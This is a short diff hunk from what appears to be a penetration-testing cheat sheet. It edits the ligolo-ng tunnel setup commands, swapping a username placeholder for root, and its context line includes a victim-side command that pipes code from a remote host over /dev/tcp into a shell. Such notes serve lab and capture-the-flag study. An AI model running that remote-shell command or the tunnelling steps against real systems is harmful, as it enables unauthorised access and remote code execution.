@@ -102,7 +102,7 @@ cat < /dev/tcp/10.10.10.10/80 | sh #Victim
 ligolo-ng port forwarding tool commands:
 -----------------------------------------------------------------------
 ```
-sudo ip tuntap add user [your_username(kali)] mode tun ligolo
+sudo ip tuntap add user root mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert (for hacking ctf machines)
 ./proxy -autocert (for real world)
